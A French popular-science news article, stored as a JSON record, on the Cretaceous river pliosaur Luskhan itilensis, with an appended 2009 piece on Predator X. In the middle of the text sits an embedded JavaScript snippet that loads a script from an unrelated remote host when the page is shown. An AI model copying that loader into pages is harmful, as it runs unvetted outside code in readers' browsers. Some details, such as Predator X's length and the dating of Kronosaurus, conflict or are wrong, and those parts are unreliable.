{"title": "Découverte d'un curieux pliosaure, terreur de la Volga du Crétacé", "newspaper": "Futura Sciences", "author": "Jean-Luc Goudet", "date_publi": "29/05/2017", "content": "En Russie, le crâne d'un grand animal datant du Crétacé est celui d'un petit pliosaure. Avec son long rostre, il ressemble à un dauphin d'eau douce, et c'est bien là qu'il vivait il y a 130 millions d'années. Ce « maître de l'esprit de la Volga », comme l'ont baptisé ses découvreurs, est un exemple de convergence évolutive. Lui et ses cousins ont disparu bien avant les dinosaures. Ce qu'il faut retenir Un crâne de pliosaure, c'est-à-dire un plésiosaure à cou court, a été découvert en Russie. Il vivait apparemment dans les fleuves et sa mâchoire prenait la forme d'un long rostre, comme chez les actuels dauphins d'eau douce et gavial du Gange. La découverte contraint de revoir l'histoire des pliosaures qui ont manifestement survécu à la crise de la fin du Jurassique, avant de s'éteindre définitivement, longtemps avant les dinosaures. Les  plésiosaures , ces grands tétrapodes marins à quatre larges nageoires, hantaient les océans à l'époque où les dinosaures régnaient sur les terres émergées. Les plus grands dépassaient les dix mètres et beaucoup avaient un cou immense (qui n'a pas manqué d'inspirer les adorateurs du monstre du loch Ness). Parmi les  plésiosaures , certains, les pliosaures, avaient au contraire un cou plutôt court et surtout un énorme  crâne , jusqu'à deux mètres, agrémenté d'une mâchoire armée de dents souvent géantes. Elles auraient fait pâlir de jalousie le célèbre T-rex s'il n'avait pas vécu bien plus tard, au  Crétacé , contrairement à ce que peut laisser croire  Jurassic Park . Les pliosaures, eux, ont eu en effet leurs heures de gloire au  Jurassique  et semblaient même n'avoir jamais atteint le Crétacé, quand le supercontinent Pangée finissait de se découper en grands morceaux et que le climat se refroidissait sévèrement. Pourtant, en 2008, une équipe présentait «  Predator X  », ensuite officiellement baptisé  Pliosaurus funkei  et âgé de seulement 147 millions d'années, ce qui le situe à la fin du Jurassique. Avec ses 12 m et ses dents de 30 cm, il devait faire bonne figure dans les océans de l'époque (voir l'article ci-dessous). Une représentation possible du pliosaure  Luskhan itilensis  qui vivait dans les eaux douces, au Crétacé. On remarque les quatre grandes nageoires. © Andrey Atochin                               Les plésiosaures ont survécu au Jurassique Aujourd'hui, une équipe vient de décrire dans  Current Biology  un pliosaure original, découvert en Russie, qui vivait il y a seulement 130 millions d'années, donc durant le Crétacé inférieur. Baptisé  Luskhan itilensis , il inaugure à la fois une  espèce  nouvelle et un genre nouveau. Le crâne retrouvé indique un animal de grande taille et se caractérise par un rostre long de 1,5 m. Il ne vivait pas dans l'océan mais dans les fleuves. Son nom signifie d'ailleurs, d'après le  communiqué de l’université de Liège , « le maître de l'esprit de la Volga ».  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Son allure le rapproche des dauphins d'eau douce et du gavial du Gange, ce qui serait un exemple de convergence. Selon les auteurs, les pliosaures auraient connu  « plusieurs épisodes de convergences évolutives [...], notamment après un important évènement d'extinction à la fin du Jurassique (il y a 145 millions d'années) » . Ce groupe aurait donc surmonté cette phase mais aurait succombé à la suivante, survenue des dizaines de millions d'années avant celle qui, à la fin du Crétacé, a eu raison, entre autres, des dinosaures. Pour en savoir plus En images : Predator X, un pliosaure marin géant de 45 tonnes Article de Jean-Luc Goudet publié le 15 avril 2009 Découverte au Svalbard et présentée l'an dernier, cette espèce inconnue de  plésiosauriens  est l'un des plus grands reptiles  carnivores  marins connus à ce jour. Ce chasseur de quinze mètres de longueur, à la mâchoire plus puissante que celle d'un tyrannosaure, hantait les océans il y a quelque 150 millions d'années. Des reconstitutions récentes donnent de l'animal des images saisissantes et fournissent de nouvelles données. Entre 2006 et 2007, une équipe internationale de paléontologues menée par le Norvégien Jørn Hurumne de l'université d'Oslo, a exploré une région montagneuse de l' archipel  du Svalbard, au-delà du cercle polaire  arctique . L'endroit s'est révélé particulièrement riche en  fossiles  et a offert à l'équipe un  ichtyosaure  puis un  magnifique pliosaure géant , dont  l'extraction a demandé deux ans travail . Faute de mieux, l'animal a été baptisé Predator X. Prédateur, ce géant l'était certainement, avec ses dents de trente centimètres et une longue mâchoire dont on estime la puissance à quatre fois celle d'un  Tyrannosaurus  rex . Scène de vie dans les océans du Jurassique. Un Predator X, long d'une quinzaine de mètres attrape un plésiosaure en le saisissant au niveau de son très long cou. ©  Natural History Museum, University of Oslo Cet animal est un plésiosaurien, un vaste groupe d'animaux marins de grandes tailles, munis de quatre puissantes nageoires, qui ont eu leur heure de gloire à la fin du Jurassique, notamment avec une espèce célèbre, le Liopleurodon, dont la longueur maximale, discutée, était d'au moins sept mètres et peut-être beaucoup plus. Tout au long du Jurassique, on note une évolution des nageoires, qui se font plus courtes et plus larges, les rendant plus efficaces. On divise ce groupe en deux, les plésiosaures, à la petite tête portée par un cou très long, et les pliosaures, se distinguant par une grosse tête et un cou court. Des découvertes récentes ont mis en doute cette distinction mais, si on la conserve, le nouveau venu est un pliosaure, comme le Liopleurodon, avec une énorme tête soutenue par un cou puissant. L'équipe des découvreurs, dans les hauteurs glacées du Spitzberg, devant les restes fossilisés. ©  Natural History Museum, University of Oslo Qui est le plus grand ? Dans les séries fossiles, les grands pliosaures semblent s'éclipser avant le Crétacé, avec un seul genre connu à la fin du Jurassique, le  Kronosaurus . Avec ses 147 millions d'années, Predator X vient démentir cette hypothèse. Dans les océans de la fin du Jurassique, les pliosaures avaient encore la vedette... Long de quinze mètres, ce pliosaure tardif devait peser environ quarante-cinq tonnes. Dans la compétition de la taille la plus grande, Predator X a une bonne chance de figurer sur le haut du podium. Le crâne de Predator X, montré sur une vidéo de la chaîne  History.Com  (cliquer sur l'image pour y accéder).                               Mais on sait bien peu de choses des géants des mers de cette époque. La controverse sur la longueur du Liopleurodon dure toujours et, en 2002, on exhumait au Mexique les restes d'un pliosaure, dont un crâne de près de quatre mètres, baptisé depuis monstre d'Aramberri, du nom de la ville près de laquelle il a été trouvé. Reconstitué par les paléontologues du musée d'histoire naturelle de Karlsruhe, l'animal, qui n'est pas un Liopleurodon, mesurait au moins quinze mètres et serait un jeune individu mort avant la fin de sa croissance. L'adulte aurait donc peut-être dépassé les vingt mètres. Le concours continue... Les paléontologues ont un autre travail, moins spectaculaire mais scientifiquement plus important, celui de préciser les filiations et l'histoire de ce grand groupe des plésiosauriens. Les résultats complets devraient être publiés à la fin de l'année 2009. ", "theme": "planete"}